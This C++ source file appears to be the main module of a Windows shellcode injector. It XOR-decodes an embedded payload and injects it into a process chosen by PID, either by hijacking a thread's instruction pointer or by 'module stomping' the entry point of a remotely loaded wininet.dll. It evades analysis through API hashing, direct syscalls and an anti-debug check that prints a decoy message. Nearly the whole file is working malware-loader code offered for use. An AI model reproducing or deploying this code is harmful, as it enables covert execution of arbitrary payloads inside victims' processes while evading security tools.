#include "def.h"





#include "helper.hpp"
#include "syscall.hpp"
#include "debug.hpp"
#include "syscall_global.hpp"
#include "injector.hpp"
#include "apc.hpp"


#include <psapi.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <intrin.h>
#include <TlHelp32.h>




PVOID addr = NULL;
DWORD process_id = NULL;
HANDLE hProcess, hThread;
LPVOID rBuffer;
BOOL pMemory;









HANDLE threadHijacked = NULL;
HANDLE snapshot;
THREADENTRY32 threadEntry;
CONTEXT context;

VOID threadHijacking(HANDLE hProcess, LPVOID rBuffer, DWORD process_id) {

    HANDLE threadHijacked = apcInjector.findThread(process_id);



    apcInjector.mySuspendThread(threadHijacked);
    context.ContextFlags = CONTEXT_CONTROL;

    apcInjector.myThreadContext(threadHijacked, &context);

    // If context.Rip is 0 here, your syscall failed or flags were wrong
    //std::cout << "Original RIP: " << (PVOID)context.Rip << "\n";

    // Update RIP to our shellcode
    context.Rip = (DWORD64)rBuffer;

    //std::cout << "Modified RIP: " << context.Rip << "\n";
    apcInjector.myNtSetContextThread(threadHijacked, &context);

    apcInjector.myNtResumeThread(threadHijacked);

    mainInjector.closeH(threadHijacked);

};






void apcQueueInjection(int pid) {
    hProcess = mainInjector.process(pid);
    rBuffer = mainInjector.vAlloc(hProcess, addr, shellcode_len);
    mainInjector.wrMem(hProcess, rBuffer, shellcode, shellcode_len);
    BOOL ok = mainInjector.protectMem(hProcess, rBuffer);
    std::cout << "thread hijacking !!";

     
    threadHijacking(hProcess, rBuffer, pid);
    mainInjector.closeH(hProcess);
    std::cout << " [+] Succesfully " << std::endl;
    
}


void moduleStomping(int pid) {
	
    wchar_t moduleToInject[] = L"C:\\windows\\system32\\wininet.dll";
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;

    hProcess = mainInjector.process(process_id);
    rBuffer = mainInjector.vAlloc(hProcess, NULL, sizeof(moduleToInject));
    //rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
    mainInjector.wrMem(hProcess, rBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject));
    //WriteProcessMemory(hProcess, rBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject), NULL);

    unsigned char* k = helperHandler.getKernel32();

    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    

    PVOID pLoadLibraryW = syscallHandler.getFunctionAddressByHash(wK, 1606414609);

    // 3. Cast it to the function pointer type for use in CreateRemoteThread or ntThread
    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)pLoadLibraryW;
    //ntThread(hProcess, rBuffer);
    HANDLE dllThread = mainInjector.ntThread(hProcess, threadRoutine, rBuffer);
    mainInjector.waitForSingle(dllThread);

	
    // find base address of the injected benign DLL in remote process
    remoteModule = (HMODULE)mainInjector.findRemoteModule(hProcess, L"wininet.dll");
    
    // get DLL's AddressOfEntryPoint
    DWORD headerBufferSize = 0x1000;
    std::cout << "allocating heap" << "\n";
    PVOID targetProcessHeaderBuffer = mainInjector.vAlloc(
        (HANDLE)-1,           // (HANDLE)-1 is a pseudo-handle for the current process
        NULL,                 // Let the OS pick the address
        headerBufferSize      // 4KB is enough for PE headers
    );
    sysNtReadVirtualMemory(hProcess, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
    PVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
    std::cout << ", entryPoint at " << dllEntryPoint;
    SIZE_T bytesWritten = 0;
    SIZE_T len_shellcode = shellcode_len;
	DWORD oldProtect = 0;
	SIZE_T size = 0x4000;
	
    NTSTATUS rwxStatus = mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_READWRITE);
   
	std::cout << "\nstatus after changing permissions to rwx: " << rwxStatus << "\n";
    NTSTATUS status = mainInjector.wrMem(hProcess, dllEntryPoint, (LPVOID)shellcode, len_shellcode);
	std::cout << "\nstatus after writing shellcode to dllentryPoint: " << status << "\n";
    mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_EXECUTE_READ);
    //sysNtProtectVirtualMemory(hProcess, &dllEntryPoint, &len_shellcode, PAGE_EXECUTE_READ, &oldProtect);
    // execute shellcode from inside the benign DLL
	mainInjector.ntThread(hProcess, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL);
    

}
int main(int argc, char* argv[]) {

    if (antiDebug.checkDebug() != 0) {
        std::cout << "I am doign nothing malicious man !!" << "\n";
        return 0;
    }




    if (argc < 2) {
        std::cout << "Enter an pid and a module name (etheir stomp or apc)" << std::endl;
        return EXIT_FAILURE;
    }
    if (argc < 3) {
        std::cout << "Enter a module name (etheir stomp or apc)" << std::endl;
        return EXIT_FAILURE;
    }
    process_id = atoi(argv[1]);

    unsigned char shellcode_key = 0x67;


    helperHandler.xor_shellcode(shellcode, shellcode_len, shellcode_key);

    if(strcmp(argv[2], "apc") == 0) {
        apcQueueInjection(process_id);
    }
	else if(strcmp(argv[2], "stomp") == 0)
    {
        moduleStomping(process_id);
    
    }
    else {
		std::cout << "Invalid method specified. Use 'apc' or 'stomp'." << std::endl;
		return EXIT_FAILURE;
    }


    return 0;
}